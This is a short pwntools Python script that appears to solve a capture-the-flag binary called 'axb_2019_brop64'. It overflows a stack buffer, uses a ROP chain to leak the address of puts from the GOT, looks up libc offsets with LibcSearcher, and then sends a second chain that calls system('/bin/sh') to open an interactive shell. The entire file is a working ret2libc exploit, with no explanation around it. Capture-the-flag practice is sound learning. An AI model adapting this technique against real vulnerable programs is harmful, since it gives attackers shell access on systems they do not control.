# coding:utf-8

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

proc_name = 'axb_2019_brop64'
p = process(proc_name)
elf = ELF(proc_name)

padding = 'a' * 0xd0
fake_ebp = 'k1ose2jo'
repeater_addr = elf.sym['repeater']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x0400963

payload1 = padding + fake_ebp + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(repeater_addr)
p.recvuntil('Please tell me:')
p.sendline(payload1)

recv_addr = p.recvuntil('\x7f')[-6:]
puts_addr = u64(recv_addr.ljust(8, '\x00'))

log.success('puts_addr: ' + hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')

payload2 = padding + fake_ebp + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr) + p64(repeater_addr)
p.recvuntil('Please tell me:')
p.sendline(payload2)

p.interactive()

